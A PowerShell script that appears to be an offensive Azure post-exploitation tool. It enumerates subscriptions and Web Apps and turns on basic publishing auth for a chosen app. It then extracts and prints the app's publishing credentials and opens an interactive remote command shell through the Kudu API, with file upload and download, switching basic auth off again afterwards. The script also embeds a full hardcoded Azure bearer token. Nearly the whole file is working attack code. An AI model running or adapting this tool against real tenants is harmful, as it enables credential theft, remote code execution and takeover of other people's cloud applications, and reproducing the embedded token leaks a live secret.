Function WebApp-Shell {
	


function Invoke-AzureRest {
    param(
        [string]$Method = "GET",
        [string]$Uri,
        [hashtable]$Headers,
        [string]$Body = $null,
        [string]$ContentType = "application/json"
    )
    try {
        $params = @{
            Method  = $Method
            Uri     = $Uri
            Headers = $Headers
        }
        if ($Body) {
            $params.Body        = $Body
            $params.ContentType = $ContentType
        }
        return Invoke-RestMethod @params
    }
    catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        Write-Host "  [!] API Error ($statusCode): $($_.Exception.Message)" -ForegroundColor Yellow
        return $null
    }
}

# ─────────────────────────────────────────────
# Step 1: Get Access Token
# ─────────────────────────────────────────────
function Get-AzToken {
    param([string]$ProvidedToken)

    if ($ProvidedToken) {
        return $ProvidedToken
    }

    # Try Az module
    try {
        $ctx = Get-AzContext -ErrorAction Stop
        if ($ctx) {
            $token = (Get-AzAccessToken -ResourceUrl "https://management.azure.com/" -ErrorAction Stop).Token
            Write-Host "[+] Token acquired from Az module context" -ForegroundColor Green
            return $token
        }
    } catch {}

    # Try az CLI
    try {
        $token = (az account get-access-token --resource https://management.azure.com --query accessToken -o tsv 2>$null)
        if ($token) {
            Write-Host "[+] Token acquired from az CLI" -ForegroundColor Green
            return $token
        }
    } catch {}

    # Manual input
    Write-Host "[*] No token source found. Enter token manually." -ForegroundColor Cyan
    $token = Read-Host -Prompt "Access Token (management.azure.com)"
    if ([string]::IsNullOrWhiteSpace($token)) {
        Write-Host "[!] No token provided. Exiting." -ForegroundColor Red
        exit 1
    }
    return $token
}

# ─────────────────────────────────────────────
# Step 2: Enumerate Subscriptions
# ─────────────────────────────────────────────
function Get-Subscriptions {
    param([hashtable]$Headers)

    Write-Host "`n[*] Enumerating subscriptions..." -ForegroundColor Cyan
    $resp = Invoke-AzureRest -Uri "https://management.azure.com/subscriptions?api-version=2021-01-01" -Headers $Headers
    if (-not $resp -or -not $resp.value) {
        Write-Host "[!] No subscriptions found or access denied." -ForegroundColor Red
        return @()
    }
    $subs = $resp.value | ForEach-Object {
        [PSCustomObject]@{
            SubscriptionId   = $_.subscriptionId
            SubscriptionName = $_.displayName
            State            = $_.state
        }
    }
    Write-Host "[+] Found $($subs.Count) subscription(s)" -ForegroundColor Green
    foreach ($s in $subs) {
        Write-Host "    - $($s.SubscriptionName) ($($s.SubscriptionId)) [$($s.State)]" -ForegroundColor Gray
    }
    return $subs
}

# ─────────────────────────────────────────────
# Step 3: Enumerate Web Apps across all subs
# ─────────────────────────────────────────────
function Get-AllWebApps {
    param(
        [array]$Subscriptions,
        [hashtable]$Headers
    )

    Write-Host "`n[*] Enumerating Web Apps across all subscriptions..." -ForegroundColor Cyan
    $allApps = @()

    foreach ($sub in $Subscriptions) {
        if ($sub.State -ne "Enabled") { continue }

        $subId   = $sub.SubscriptionId
        $subName = $sub.SubscriptionName

        # Get all web apps in the subscription
        $uri  = "https://management.azure.com/subscriptions/$subId/resources?`$filter=resourceType eq 'Microsoft.Web/Sites'&api-version=2016-09-01"
        $resp = Invoke-AzureRest -Uri $uri -Headers $Headers

        if (-not $resp -or -not $resp.value) { continue }

        foreach ($app in $resp.value) {
            # Extract resource group from the resource ID
            $rgMatch = $app.id -match "/resourceGroups/([^/]+)/"
            $rg = if ($rgMatch) { $Matches[1] } else { "Unknown" }

            # Fetch detailed site properties to get the real SCM hostname
            $detailUri = "https://management.azure.com/subscriptions/$subId/resourceGroups/$rg/providers/Microsoft.Web/sites/$($app.name)?api-version=2021-01-15"
            $detail    = Invoke-AzureRest -Uri $detailUri -Headers $Headers

            $scmHost = ""
            if ($detail -and $detail.properties -and $detail.properties.enabledHostNames) {
                $scmHost = $detail.properties.enabledHostNames | Where-Object { $_ -match "\.scm\." } | Select-Object -First 1
            }
            # Fallback if enabledHostNames didn't work — try hostNameSslStates
            if (-not $scmHost -and $detail -and $detail.properties -and $detail.properties.hostNameSslStates) {
                $scmEntry = $detail.properties.hostNameSslStates | Where-Object { $_.hostType -eq 1 -or $_.name -match "\.scm\." } | Select-Object -First 1
                if ($scmEntry) { $scmHost = $scmEntry.name }
            }
            # Last fallback
            if (-not $scmHost) { $scmHost = "$($app.name).scm.azurewebsites.net" }

            $defaultHostName = if ($detail -and $detail.properties -and $detail.properties.defaultHostName) {
                $detail.properties.defaultHostName
            } else { "$($app.name).azurewebsites.net" }

            Write-Host "    [+] $($app.name) -> SCM: $scmHost" -ForegroundColor Gray

            $allApps += [PSCustomObject]@{
                Name             = $app.name
                ResourceGroup    = $rg
                SubscriptionId   = $subId
                SubscriptionName = $subName
                OS               = $app.kind
                Location         = $app.location
                ResourceId       = $app.id
                ScmHost          = $scmHost
                DefaultHostName  = $defaultHostName
                Permission       = "Checking..."
            }
        }
    }

    Write-Host "[+] Found $($allApps.Count) Web App(s) total" -ForegroundColor Green
    return $allApps
}

# ─────────────────────────────────────────────
# Step 4: Check permissions on each Web App
# ─────────────────────────────────────────────
function Check-Permissions {
    param(
        [array]$WebApps,
        [hashtable]$Headers
    )

    Write-Host "`n[*] Checking permissions on each Web App..." -ForegroundColor Cyan

    foreach ($app in $WebApps) {
        $uri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"
        $resp = Invoke-AzureRest -Uri $uri -Headers $Headers

        if ($resp -and $resp.value) {
            $actions    = ($resp.value | ForEach-Object { $_.actions }) -join ","
            $notActions = ($resp.value | ForEach-Object { $_.notActions }) -join ","

            if ($actions -match "\*") {
                $app.Permission = "Owner/Contributor (Full)"
            }
            elseif ($actions -match "Microsoft\.Web/sites/publish" -or $actions -match "Microsoft\.Web/sites/config") {
                $app.Permission = "Website Contributor"
            }
            else {
                $app.Permission = "Reader/Limited"
            }

            # Verify publishing credentials access
            $credUri = "https://management.azure.com/subscriptions/$($app.SubscriptionId)/resourceGroups/$($app.ResourceGroup)/providers/Microsoft.Web/sites/$($app.Name)/config/publishingcredentials/list?api-version=2023-12-01"
            $credResp = Invoke-AzureRest -Method "POST" -Uri $credUri -Headers $Headers
            if ($credResp -and $credResp.properties) {
                $app.Permission += " [PublishCreds: YES]"
            }
            else {
                $app.Permission += " [PublishCreds: NO]"
            }
        }
        else {
            $app.Permission = "No Access / Denied"
        }
    }
    return $WebApps
}

# ─────────────────────────────────────────────
# Display Web Apps Table
# ─────────────────────────────────────────────
function Show-WebAppMenu {
    param([array]$WebApps)

    Write-Host "`n" -NoNewline
    Write-Host "═══════════════════════════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan
    Write-Host " #   | Name                  | OS          | Subscription          | Resource Group     | Permission" -ForegroundColor White
    Write-Host "═══════════════════════════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan

    for ($i = 0; $i -lt $WebApps.Count; $i++) {
        $app = $WebApps[$i]
        $num    = ($i + 1).ToString().PadRight(4)
        $name   = $app.Name.PadRight(22).Substring(0, 22)
        $os     = $app.OS.PadRight(12).Substring(0, 12)
        $sub    = $app.SubscriptionName.PadRight(22).Substring(0, 22)
        $rg     = $app.ResourceGroup.PadRight(19).Substring(0, 19)
        $perm   = $app.Permission

        $color = if ($perm -match "PublishCreds: YES") { "Green" }
                 elseif ($perm -match "No Access") { "Red" }
                 else { "Yellow" }

        Write-Host " $num | $name | $os | $sub | $rg | " -NoNewline -ForegroundColor Gray
        Write-Host "$perm" -ForegroundColor $color
    }

    Write-Host "═══════════════════════════════════════════════════════════════════════════════════════════════════" -ForegroundColor DarkCyan
    Write-Host " [0] Refresh  |  [Q] Quit" -ForegroundColor DarkYellow
    Write-Host ""
}

# ─────────────────────────────────────────────
# Enable / Disable Basic Auth
# ─────────────────────────────────────────────
function Set-BasicAuth {
    param(
        [PSCustomObject]$App,
        [hashtable]$Headers,
        [bool]$Enable
    )

    $state = if ($Enable) { "Enabling" } else { "Disabling" }
    $allow = if ($Enable) { $true } else { $false }
    Write-Host "  [*] $state Basic Auth (FTP + SCM)..." -ForegroundColor Cyan

    $body    = @{ properties = @{ allow = $allow } } | ConvertTo-Json
    $baseUri = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)"

    $ftpUri = "$baseUri/basicPublishingCredentialsPolicies/ftp?api-version=2023-12-01"
    $scmUri = "$baseUri/basicPublishingCredentialsPolicies/scm?api-version=2023-12-01"

    Invoke-AzureRest -Method "PUT" -Uri $ftpUri -Headers $Headers -Body $body | Out-Null
    Invoke-AzureRest -Method "PUT" -Uri $scmUri -Headers $Headers -Body $body | Out-Null

    $result = if ($Enable) { "enabled" } else { "disabled" }
    Write-Host "  [+] Basic Auth $result" -ForegroundColor Green
}

# ─────────────────────────────────────────────
# Get Publishing Credentials
# ─────────────────────────────────────────────
function Get-PublishingCredentials {
    param(
        [PSCustomObject]$App,
        [hashtable]$Headers
    )

    Write-Host "  [*] Extracting publishing credentials..." -ForegroundColor Cyan
    $uri  = "https://management.azure.com/subscriptions/$($App.SubscriptionId)/resourceGroups/$($App.ResourceGroup)/providers/Microsoft.Web/sites/$($App.Name)/config/publishingcredentials/list?api-version=2023-12-01"
    $resp = Invoke-AzureRest -Method "POST" -Uri $uri -Headers $Headers

    if ($resp -and $resp.properties) {
        $username = $resp.properties.publishingUserName
        $password = $resp.properties.publishingPassword
        Write-Host "  [+] Username: $username" -ForegroundColor Green
        Write-Host "  [+] Password: $password" -ForegroundColor Green
        return @{ Username = $username; Password = $password }
    }
    else {
        Write-Host "  [!] Failed to retrieve credentials" -ForegroundColor Red
        return $null
    }
}

# ─────────────────────────────────────────────
# Kudu VFS: Normalize path for VFS API
# VFS root = /home (Linux) or D:\home (Windows)
# So all paths should be relative to "home",
# e.g. site/wwwroot/file.txt
#
# If user gives a relative name (e.g. "file.txt")
# it gets prepended with VfsWorkDir so it lands
# in the shell's current working directory.
# ─────────────────────────────────────────────
function Normalize-VfsPath {
    param(
        [string]$InputPath,
        [string]$VfsWorkDir = "site/wwwroot"
    )

    $p = $InputPath.Trim()

    # Convert backslashes to forward slashes (Windows paths)
    $p = $p -replace "\\", "/"

    # Strip drive letter prefix (D:/home/, C:/home/)
    $p = $p -replace "^[A-Za-z]:/home/", ""

    # Strip absolute /home/ prefix (user types Linux full path)
    $p = $p -replace "^/home/", ""

    # Strip leading slash
    $p = $p -replace "^/", ""

    # If path doesn't start with a known VFS top-level directory,
    # treat it as relative to the working directory
    $knownRoots = "^(site/|LogFiles/|data/|SiteExtensions/|devtools/|\.)"
    if ($p -notmatch $knownRoots) {
        $p = "$($VfsWorkDir.TrimEnd('/'))/$p"
    }

    return $p
}

# ─────────────────────────────────────────────
# Kudu VFS: Download file from Web App
# ─────────────────────────────────────────────
function Invoke-KuduDownload {
    param(
        [string]$ScmHost,
        [hashtable]$AuthHeader,
        [string]$RemotePath,
        [string]$LocalPath
    )

    # Normalize: VFS expects path relative to home root
    $vfsPath = Normalize-VfsPath $RemotePath
    $uri = "https://$ScmHost/api/vfs/$vfsPath"

    Write-Host "  [*] Downloading: $uri" -ForegroundColor Cyan
    Write-Host "  [*] Saving to:   $LocalPath" -ForegroundColor Cyan

    try {
        Invoke-RestMethod -Uri $uri -Method Get -Headers $AuthHeader -OutFile $LocalPath -ErrorAction Stop
        $size = (Get-Item $LocalPath).Length
        $sizeStr = if ($size -gt 1MB) { "{0:N2} MB" -f ($size / 1MB) }
                   elseif ($size -gt 1KB) { "{0:N2} KB" -f ($size / 1KB) }
                   else { "$size bytes" }
        Write-Host "  [+] Downloaded successfully ($sizeStr)" -ForegroundColor Green
    }
    catch {
        $code = $_.Exception.Response.StatusCode.value__
        if ($code -eq 404) {
            Write-Host "  [!] File not found on remote: $RemotePath" -ForegroundColor Red
        }
        else {
            Write-Host "  [!] Download failed ($code): $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# ─────────────────────────────────────────────
# Kudu VFS: Upload file to Web App
# ─────────────────────────────────────────────
function Invoke-KuduUpload {
    param(
        [string]$ScmHost,
        [hashtable]$AuthHeader,
        [string]$LocalPath,
        [string]$RemotePath
    )

    if (-not (Test-Path $LocalPath)) {
        Write-Host "  [!] Local file not found: $LocalPath" -ForegroundColor Red
        return
    }

    $vfsPath = Normalize-VfsPath $RemotePath
    $uri = "https://$ScmHost/api/vfs/$vfsPath"

    $fileBytes   = [System.IO.File]::ReadAllBytes($LocalPath)
    $size        = $fileBytes.Length
    $sizeStr     = if ($size -gt 1MB) { "{0:N2} MB" -f ($size / 1MB) }
                   elseif ($size -gt 1KB) { "{0:N2} KB" -f ($size / 1KB) }
                   else { "$size bytes" }

    Write-Host "  [*] Uploading: $LocalPath ($sizeStr)" -ForegroundColor Cyan
    Write-Host "  [*] Target:    $uri" -ForegroundColor Cyan

    try {
        # VFS PUT requires If-Match: * to overwrite existing files
        $uploadHeaders = $AuthHeader.Clone()
        $uploadHeaders["If-Match"] = "*"

        Invoke-RestMethod -Uri $uri -Method Put -Headers $uploadHeaders -Body $fileBytes -ContentType "application/octet-stream" -ErrorAction Stop
        Write-Host "  [+] Uploaded successfully" -ForegroundColor Green
    }
    catch {
        $code = $_.Exception.Response.StatusCode.value__
        Write-Host "  [!] Upload failed ($code): $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ─────────────────────────────────────────────
# Kudu VFS: List directory on Web App
# ─────────────────────────────────────────────
function Invoke-KuduLs {
    param(
        [string]$ScmHost,
        [hashtable]$AuthHeader,
        [string]$RemotePath
    )

    # VFS directory listing requires a trailing slash
    $vfsPath = (Normalize-VfsPath $RemotePath).TrimEnd("/") + "/"
    $uri = "https://$ScmHost/api/vfs/$vfsPath"

    try {
        $items = Invoke-RestMethod -Uri $uri -Method Get -Headers $AuthHeader -ErrorAction Stop

        if (-not $items -or $items.Count -eq 0) {
            Write-Host "  (empty directory)" -ForegroundColor Gray
            return
        }

        Write-Host ""
        Write-Host "  Type   Size          Modified                 Name" -ForegroundColor DarkCyan
        Write-Host "  ────   ────          ────────                 ────" -ForegroundColor DarkCyan

        foreach ($item in $items) {
            $isDir = if ($item.mime -eq "inode/directory") { "DIR " } else { "FILE" }
            $color = if ($item.mime -eq "inode/directory") { "Cyan" } else { "White" }

            $sizeVal = if ($item.mime -eq "inode/directory") { "-" }
                       elseif ($item.size -gt 1MB) { "{0:N1} MB" -f ($item.size / 1MB) }
                       elseif ($item.size -gt 1KB) { "{0:N1} KB" -f ($item.size / 1KB) }
                       else { "$($item.size) B" }

            $modified = try { ([datetime]$item.mtime).ToString("yyyy-MM-dd HH:mm:ss") } catch { $item.mtime }
            $name     = $item.name

            $typeStr = $isDir.PadRight(5)
            $sizeStr = $sizeVal.PadRight(14)
            $modStr  = "$modified".PadRight(25)

            Write-Host "  $typeStr $sizeStr $modStr " -NoNewline -ForegroundColor Gray
            Write-Host "$name" -ForegroundColor $color
        }
        Write-Host ""
    }
    catch {
        $code = $_.Exception.Response.StatusCode.value__
        if ($code -eq 404) {
            Write-Host "  [!] Directory not found: $RemotePath" -ForegroundColor Red
        }
        else {
            Write-Host "  [!] Listing failed ($code): $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# ─────────────────────────────────────────────
# Interactive Shell via Kudu (SCM)
# ─────────────────────────────────────────────
function Start-InteractiveShell {
    param(
        [PSCustomObject]$App,
        [hashtable]$Creds
    )

    $scmHost = $App.ScmHost
    $cmdUri  = "https://$scmHost/api/command"

    Write-Host "  [*] SCM Endpoint: $scmHost" -ForegroundColor DarkGray

    # Build Basic Auth header
    $pair      = "$($Creds.Username):$($Creds.Password)"
    $bytes     = [System.Text.Encoding]::ASCII.GetBytes($pair)
    $b64       = [Convert]::ToBase64String($bytes)
    $authHeader = @{ Authorization = "Basic $b64" }

    # Determine working dir based on OS
    $isLinux = $App.OS -match "linux"
    $workDir = if ($isLinux) { "/home/site/wwwroot" } else { "site\\wwwroot" }


    try {
        while ($true) {
            Write-Host "  [$($App.Name)] " -ForegroundColor Red -NoNewline
            $command = Read-Host -Prompt ">>>"

            if ([string]::IsNullOrWhiteSpace($command)) { continue }
            if ($command -match "^(exit|quit)$") { break }

            # ── Built-in: upload <local> <remote> ──
            if ($command -match "^upload\s+(.+?)\s+(.+)$") {
                $localPath  = $Matches[1].Trim('"', "'")
                $remotePath = $Matches[2].Trim('"', "'")
                Invoke-KuduUpload -ScmHost $scmHost -AuthHeader $authHeader -LocalPath $localPath -RemotePath $remotePath
                continue
            }

            # ── Built-in: download <remote> <local> ──
            if ($command -match "^download\s+(.+?)\s+(.+)$") {
                $remotePath = $Matches[1].Trim('"', "'")
                $localPath  = $Matches[2].Trim('"', "'")
                Invoke-KuduDownload -ScmHost $scmHost -AuthHeader $authHeader -RemotePath $remotePath -LocalPath $localPath
                continue
            }

            # ── Built-in: vfs-ls <path> ──
            if ($command -match "^vfs-ls\s*(.*)$") {
                $remotePath = $Matches[1].Trim('"', "'")
                if ([string]::IsNullOrWhiteSpace($remotePath)) {
                    $remotePath = "site/wwwroot"
                }
                Invoke-KuduLs -ScmHost $scmHost -AuthHeader $authHeader -RemotePath $remotePath
                continue
            }

            # ── Regular command execution ──
            $commandBody = @{
                command = $command
                dir     = $workDir
            } | ConvertTo-Json

            try {
                $response = Invoke-RestMethod -Uri $cmdUri -Method Post -Body $commandBody -ContentType "application/json" -Headers $authHeader -ErrorAction Stop

                if ($response.Output) {
                    Write-Host $response.Output -ForegroundColor White
                }
                if ($response.Error) {
                    Write-Host $response.Error -ForegroundColor Red
                }
                if ($response.ExitCode -ne 0) {
                    Write-Host "  [Exit Code: $($response.ExitCode)]" -ForegroundColor Yellow
                }
            }
            catch {
                Write-Host "  [!] Command failed: $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
    }
    catch {
        # Ctrl+C caught
    }
}

# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────
Clear-Host
Show-Banner

# Get token
$token   = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6ImFGa21LVkZjLTRXVjZzWENCdk5aa1hJNTA1WSIsImtpZCI6ImFGa21LVkZjLTRXVjZzWENCdk5aa1hJNTA1WSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0L2Y5M2ViOGUxLTg2ZWQtNDM4NC05ZDZmLTc4N2M2YWRhY2JmMS8iLCJpYXQiOjE3ODI2NzY1ODgsIm5iZiI6MTc4MjY3NjU4OCwiZXhwIjoxNzgyNzYzMjg4LCJhaW8iOiJBV1FBbS84Y0FBQUFLRWxrVytUUTdhMTJNcGhtWEJyQjF3MHlDUWdTL0NSVzBPV1hKYzZ1dlcyMTVRVC9NZFhUUU0zRGRaN3NXRTNabG4wbStUVXRjRnNhc0k1bkdxYjdoTDEySUYxR2I2R3NHTTRxZGZsTWVPblZ5dTI1QmdMaHd5aFBRREdYdnVxVCIsImFwcGlkIjoiNjQ5OGZkYTctZDNjZC00MWIzLWJkMDItZDM4NTUyYmIxZTUwIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvZjkzZWI4ZTEtODZlZC00Mzg0LTlkNmYtNzg3YzZhZGFjYmYxLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiYmZiZmJkMWItNTk4ZC00ZDdkLWI1MWYtOWE2ZDQ2MmM2NzRjIiwicmgiOiIxLkFHRUI0YmctLWUyR2hFT2RiM2g4YXRyTDhVWklmM2tBdXRkUHVrUGF3ZmoyTUJNQUFBQmhBUS4iLCJzdWIiOiJiZmJmYmQxYi01OThkLTRkN2QtYjUxZi05YTZkNDYyYzY3NGMiLCJ0aWQiOiJmOTNlYjhlMS04NmVkLTQzODQtOWQ2Zi03ODdjNmFkYWNiZjEiLCJ1dGkiOiI2Q0QxWWF4YmFFYTdfZXJJVHU4OEFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyIwOTk3YTFkMC0wZDFkLTRhY2ItYjQwOC1kNWNhNzMxMjFlOTAiXSwieG1zX2FjdF9mY3QiOiIzIDkiLCJ4bXNfYXpfcmlkIjoiL3N1YnNjcmlwdGlvbnMvYTU5ODE2MWYtMWU4Ni00M2RhLThkOTgtYWYyZDYyZjBmZjYxL3Jlc291cmNlZ3JvdXBzL09mZmVuc2l2ZV9TaGFrZWQvcHJvdmlkZXJzL01pY3Jvc29mdC5Db21wdXRlL3ZpcnR1YWxNYWNoaW5lcy9EQzEiLCJ4bXNfZnRkIjoiU29LMVN0aDhvbEFzX3BNUER3MFpNMUUxQnpLeWY0OERWX0l2dXJOUU0zMEJhWE55WVdWc1l5MWtjMjF6IiwieG1zX2lkcmVsIjoiNyAyNCIsInhtc19taXJpZCI6Ii9zdWJzY3JpcHRpb25zL2E1OTgxNjFmLTFlODYtNDNkYS04ZDk4LWFmMmQ2MmYwZmY2MS9yZXNvdXJjZWdyb3Vwcy9PZmZlbnNpdmVfU2hha2VkL3Byb3ZpZGVycy9NaWNyb3NvZnQuTWFuYWdlZElkZW50aXR5L3VzZXJBc3NpZ25lZElkZW50aXRpZXMvTUlTIiwieG1zX3JkIjoiMC5BVW9BdGY4S0JnZ0NFZ0xoQWhJVUNBa1NFQ3h5RUxXYVp4OUhvLTlBdjVYSDNUb1NGQWdJRWhCR1NIOTVBTHJYVDdwRDJzSDQ5akFURWhRSUN4SVFDTHQ0ZG1YS1QwWWlJVlN3M3JvazJBIiwieG1zX3N1Yl9mY3QiOiI5IDMiLCJ4bXNfdGNkdCI6MTc3MjEwMDE3Nn0.DAV9VUhRHSm-UdCyEvEbRF7nkvI2uHvpWoGNgyHDftzn9PEHbfT6P4NC3tsOGTN52_aRZmPmfSVjONw6BTa6IwpScSRNRrviROd5ZuShVwZhHRssMBeB07t3rphRYdu3tCt5u7TuJ7jEdR0fUDj6U5h_KH3AjVHchRD1qbpl0YwdX6t2i1PPeqfoTN_8VZob83hrTFvTKbP_I_Rja09fcn8KLVk1YAby-OgXVGGfKr-b3_z-8iBLWQJBHAHXBogjeDiytSZwsGeM63y6aRr8m0lXBjQxTAG0hB1A1mdy49Cm_dqcWpE_B9QXB1ok2UIpsIecXTuT2HK_yFEbMN3LyA"
$headers = @{ Authorization = "Bearer $token" }

# Enumerate
$subscriptions = Get-Subscriptions -Headers $headers
if ($subscriptions.Count -eq 0) {
    Write-Host "[!] No subscriptions accessible. Exiting." -ForegroundColor Red
    exit 1
}

$webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
if ($webApps.Count -eq 0) {
    Write-Host "[!] No Web Apps found. Exiting." -ForegroundColor Red
    exit 1
}

$webApps = Check-Permissions -WebApps $webApps -Headers $headers

# Main loop
while ($true) {
    Show-WebAppMenu -WebApps $webApps

    $choice = Read-Host -Prompt "Select Web App # (or Q to quit)"

    if ($choice -match "^[Qq]$") {
        Write-Host "`n[*] Goodbye." -ForegroundColor Cyan
        break
    }

    if ($choice -eq "0") {
        Write-Host "`n[*] Refreshing..." -ForegroundColor Cyan
        $webApps = Get-AllWebApps -Subscriptions $subscriptions -Headers $headers
        $webApps = Check-Permissions -WebApps $webApps -Headers $headers
        continue
    }

    $index = [int]$choice - 1
    if ($index -lt 0 -or $index -ge $webApps.Count) {
        Write-Host "[!] Invalid selection." -ForegroundColor Red
        continue
    }

    $selectedApp = $webApps[$index]
    Write-Host "`n[*] Selected: $($selectedApp.Name) [$($selectedApp.ResourceGroup)]" -ForegroundColor Cyan

    if ($selectedApp.Permission -match "No Access") {
        Write-Host "[!] Insufficient permissions on this Web App." -ForegroundColor Red
        continue
    }

    # Enable basic auth
    Set-BasicAuth -App $selectedApp -Headers $headers -Enable $true

    # Get publishing credentials
    $creds = Get-PublishingCredentials -App $selectedApp -Headers $headers
    if (-not $creds) {
        Write-Host "[!] Cannot proceed without credentials. Disabling basic auth..." -ForegroundColor Red
        Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
        continue
    }

    # Start shell
    Start-InteractiveShell -App $selectedApp -Creds $creds

    # Cleanup: disable basic auth
    Write-Host "`n  [*] Disconnecting from $($selectedApp.Name)..." -ForegroundColor Cyan
    Set-BasicAuth -App $selectedApp -Headers $headers -Enable $false
    Write-Host ""
}

WebApp-Shell
}
